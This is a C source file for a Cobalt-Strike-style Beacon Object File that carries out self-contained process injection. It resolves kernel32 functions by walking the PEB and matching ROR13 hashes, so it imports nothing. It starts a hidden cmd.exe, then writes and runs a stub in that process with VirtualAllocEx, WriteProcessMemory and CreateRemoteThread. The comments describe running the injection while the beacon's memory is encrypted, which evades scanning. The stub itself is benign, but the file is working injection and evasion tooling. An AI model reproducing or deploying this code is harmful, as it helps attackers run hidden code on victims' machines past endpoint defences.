/* P4 inject BOF: self-contained process injection, ZERO imports.
 *
 * Packer contract (pe/OBJExecutable + BOFUtils, reverse-engineered):
 * every relocation symbol must be a bapi.txt beacon API or a literal
 * "dll!func" dynamic name - OBJECT-INTERNAL function symbols are never
 * resolved ("Unknown symbol"). /O1 only inlines small helpers, so the
 * only safe shape is ONE function: everything lives in go() below, and
 * the shipped object's relocations reference no local function symbols.
 *
 * Zero imports at all (PEB walk + ROR13 hash resolution), so boff.cpp's
 * admission runs this INSIDE the BOFWIN masked window: the injection
 * executes while the whole beacon image + tracked heap are ciphertext.
 *
 * Observability: probe markers first (.data path vs QWORD-immediate
 * stack path - splits "the packer never carried .data" from anything
 * else), then the real marker with the remote thread exit code; 0x2A
 * proves our 6-byte stub executed in the victim. */
#include <windows.h>
#include <intrin.h>

#define BW_H_CREATEPROCESSA       0x16B3FE72UL
#define BW_H_VIRTUALALLOCEX       0x6E1A959CUL
#define BW_H_WRITEPROCESSMEMORY   0xD83D6AA1UL
#define BW_H_CREATEREMOTETHREAD   0x72BD9CDDUL
#define BW_H_WAITFORSINGLEOBJECT  0xCE05D9ADUL
#define BW_H_GETEXITCODETHREAD    0x1B3F95F9UL
#define BW_H_TERMINATEPROCESS     0x78B5B983UL
#define BW_H_CREATEFILEA          0x7C0017A5UL
#define BW_H_WRITEFILE            0xE80A791FUL
#define BW_H_CLOSEHANDLE          0x0FFD97FBUL

typedef struct {
	DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle;
	DWORD dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
	DWORD dwFillAttribute, dwFlags; WORD wShowWindow, cbReserved2;
	LPBYTE lpReserved2; HANDLE hStdInput, hStdOutput, hStdError;
} BW_STARTUPINFOA;
typedef struct {
	HANDLE hProcess, hThread; DWORD dwProcessId, dwThreadId;
} BW_PROCESS_INFORMATION;

typedef BOOL    (WINAPI *BW_CREATEPROCESSA)(LPCSTR, LPSTR, void *, void *, BOOL, DWORD, void *, LPCSTR, BW_STARTUPINFOA *, BW_PROCESS_INFORMATION *);
typedef LPVOID  (WINAPI *BW_VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *BW_WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE  (WINAPI *BW_CREATEREMOTETHREAD)(HANDLE, void *, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *BW_WAITFORSINGLEOBJECT)(HANDLE, DWORD);
typedef BOOL    (WINAPI *BW_GETEXITCODETHREAD)(HANDLE, LPDWORD);
typedef BOOL    (WINAPI *BW_TERMINATEPROCESS)(HANDLE, UINT);
typedef HANDLE  (WINAPI *BW_CREATEFILEA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *BW_WRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, void *);
typedef BOOL    (WINAPI *BW_CLOSEHANDLE)(HANDLE);

static char g_cmdline[] = "cmd.exe /c ping -n 30 127.0.0.1";
static char g_marker_path[] = "C:\\Users\\Public\\bw_inject_marker.txt";
static char g_data_probe[] = "C:\\Users\\Public\\bw_probe_data.txt";
static char g_msg_ok[] = "INJECT rc=0x2a (remote stub executed)";
static char g_msg_fail[] = "INJECT FAIL";
static char g_msg_data_ok[] = "data-ok";
static char g_msg_stack_ok[] = "stack-ok";

/* mov eax, 0x2A ; ret - the injected stub */
static const unsigned char g_stub[6] = { 0xB8, 0x2A, 0x00, 0x00, 0x00, 0xC3 };

void go(char *args, int len)
{
	unsigned long long peb, ldr;
	void *head, *cur, *k32 = NULL;
	unsigned short kname[16];
	unsigned __int64 *kq = (unsigned __int64 *)kname;
	unsigned char *b, *nth, *ed;
	DWORD *names, *funcs;
	WORD *ords;
	DWORD nexp, ei, lf, exp_rva, exp_sz;
	void *found[10];
	unsigned long wants[10];
	int nfound = 0, wi;
	BW_CREATEFILEA  pCFA;
	BW_WRITEFILE    pWF;
	BW_CLOSEHANDLE  pCH;
	BW_CREATEPROCESSA pCP;
	BW_VIRTUALALLOCEX pVAE;
	BW_WRITEPROCESSMEMORY pWPM;
	BW_CREATEREMOTETHREAD pCRT;
	BW_WAITFORSINGLEOBJECT pWFS;
	BW_GETEXITCODETHREAD pGEC;
	BW_TERMINATEPROCESS pTP;
	BW_STARTUPINFOA si;
	BW_PROCESS_INFORMATION pi;
	char stack_path[40];
	unsigned __int64 *sq = (unsigned __int64 *)stack_path;
	void *remote;
	SIZE_T written = 0;
	HANDLE th = NULL, f;
	DWORD rc = 0, written2 = 0, mlen;
	int ok = 0;
	char *msg;

	(void)args; (void)len;

	/* kernel32 via the PEB loader list, compared against L"kernel32.dll"
	 * built from QWORD immediates */
	peb = __readgsqword(0x60);
	ldr = *(unsigned long long *)(peb + 0x18);
	head = (void *)(*(unsigned long long *)(ldr + 0x10));
	kq[0] = 0x006E00720065006BULL;
	kq[1] = 0x00320033006C0065ULL;
	kq[2] = 0x006C006C0064002EULL;
	kq[3] = 0;
	cur = *(void **)head;
	while (cur != head) {
		void *base = *(void **)((unsigned char *)cur + 0x30);
		unsigned short *nm = *(unsigned short **)((unsigned char *)cur + 0x60);
		if (base != NULL && nm != NULL) {
			const unsigned short *a = nm, *c = kname;
			int eq = 1;
			while (*a && *c) {
				unsigned short x = *a, y = *c;
				if (x >= 'A' && x <= 'Z') x += 0x20;
				if (y >= 'A' && y <= 'Z') y += 0x20;
				if (x != y) { eq = 0; break; }
				a++; c++;
			}
			if (eq && *a == *c) { k32 = base; break; }
		}
		cur = *(void **)cur;
	}
	if (k32 == NULL)
		return;

	/* resolve all ten exports in one hash pass */
	b = (unsigned char *)k32;
	lf = *(DWORD *)(b + 0x3C);
	nth = b + lf;
	exp_rva = *(DWORD *)(nth + 0x88);
	exp_sz = *(DWORD *)(nth + 0x8C);
	ed = b + exp_rva;
	nexp = *(DWORD *)(ed + 0x18);
	names = (DWORD *)(b + *(DWORD *)(ed + 0x20));
	ords  = (WORD  *)(b + *(DWORD *)(ed + 0x24));
	funcs = (DWORD *)(b + *(DWORD *)(ed + 0x1C));
	wants[0] = BW_H_CREATEFILEA;        wants[1] = BW_H_WRITEFILE;
	wants[2] = BW_H_CLOSEHANDLE;        wants[3] = BW_H_CREATEPROCESSA;
	wants[4] = BW_H_VIRTUALALLOCEX;     wants[5] = BW_H_WRITEPROCESSMEMORY;
	wants[6] = BW_H_CREATEREMOTETHREAD; wants[7] = BW_H_WAITFORSINGLEOBJECT;
	wants[8] = BW_H_GETEXITCODETHREAD;  wants[9] = BW_H_TERMINATEPROCESS;
	for (wi = 0; wi < 10; wi++)
		found[wi] = NULL;
	for (ei = 0; ei < nexp && nfound < 10; ei++) {
		const char *sn = (const char *)(b + names[ei]);
		unsigned long h = 0;
		while (*sn) { h = (h >> 13) | (h << 19); h += (unsigned char)*sn++; }
		for (wi = 0; wi < 10; wi++) {
			if (found[wi] == NULL && h == wants[wi]) {
				DWORD frva = funcs[ords[ei]];
				if (!(frva >= exp_rva && frva < exp_rva + exp_sz)) {
					found[wi] = b + frva;
					nfound++;
				}
				break;
			}
		}
	}
	if (nfound != 10)
		return;
	pCFA = (BW_CREATEFILEA)found[0];
	pWF  = (BW_WRITEFILE)found[1];
	pCH  = (BW_CLOSEHANDLE)found[2];
	pCP  = (BW_CREATEPROCESSA)found[3];
	pVAE = (BW_VIRTUALALLOCEX)found[4];
	pWPM = (BW_WRITEPROCESSMEMORY)found[5];
	pCRT = (BW_CREATEREMOTETHREAD)found[6];
	pWFS = (BW_WAITFORSINGLEOBJECT)found[7];
	pGEC = (BW_GETEXITCODETHREAD)found[8];
	pTP  = (BW_TERMINATEPROCESS)found[9];

	/* probe A: .data path + .data message */
	f = pCFA(g_data_probe, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f != INVALID_HANDLE_VALUE) {
		for (mlen = 0; g_msg_data_ok[mlen]; mlen++)
			;
		pWF(f, g_msg_data_ok, mlen, &written2, NULL);
		pCH(f);
	}
	/* probe B: stack path from QWORD immediates ("C:\Users\Public\bw_probe_stack.txt") */
	sq[0] = 0x73726573555C3A43ULL;
	sq[1] = 0x5C63696C6275505CULL;
	sq[2] = 0x65626F72705F7762ULL;
	sq[3] = 0x742E6B636174735FULL;
	sq[4] = 0x0000000000007478ULL;
	f = pCFA(stack_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f != INVALID_HANDLE_VALUE) {
		for (mlen = 0; g_msg_stack_ok[mlen]; mlen++)
			;
		pWF(f, g_msg_stack_ok, mlen, &written2, NULL);
		pCH(f);
	}

	si.cb = 0; si.lpReserved = 0; si.lpDesktop = 0; si.lpTitle = 0;
	si.dwX = 0; si.dwY = 0; si.dwXSize = 0; si.dwYSize = 0;
	si.dwXCountChars = 0; si.dwYCountChars = 0; si.dwFillAttribute = 0;
	si.dwFlags = 0; si.wShowWindow = 0; si.cbReserved2 = 0;
	si.lpReserved2 = 0; si.hStdInput = 0; si.hStdOutput = 0; si.hStdError = 0;
	si.cb = sizeof(BW_STARTUPINFOA);
	pi.hProcess = 0; pi.hThread = 0; pi.dwProcessId = 0; pi.dwThreadId = 0;

	if (!pCP(NULL, g_cmdline, NULL, NULL, FALSE, 0x08000000, NULL, NULL, &si, &pi))
		return;
	remote = pVAE(pi.hProcess, NULL, 0x1000, 0x3000, 0x20 /* PAGE_EXECUTE_READ */);
	if (remote != NULL && pWPM(pi.hProcess, remote, g_stub, sizeof(g_stub), &written)) {
		th = pCRT(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
		if (th != NULL) {
			pWFS(th, 10000);
			if (pGEC(th, &rc) && rc == 0x2A)
				ok = 1;
		}
	}
	msg = ok ? g_msg_ok : g_msg_fail;
	f = pCFA(g_marker_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f != INVALID_HANDLE_VALUE) {
		for (mlen = 0; msg[mlen]; mlen++)
			;
		pWF(f, msg, mlen, &written2, NULL);
		pCH(f);
	}

	if (th != NULL) pCH(th);
	if (pi.hProcess != NULL) { pTP(pi.hProcess, 0); pCH(pi.hProcess); }
	if (pi.hThread != NULL) pCH(pi.hThread);
}
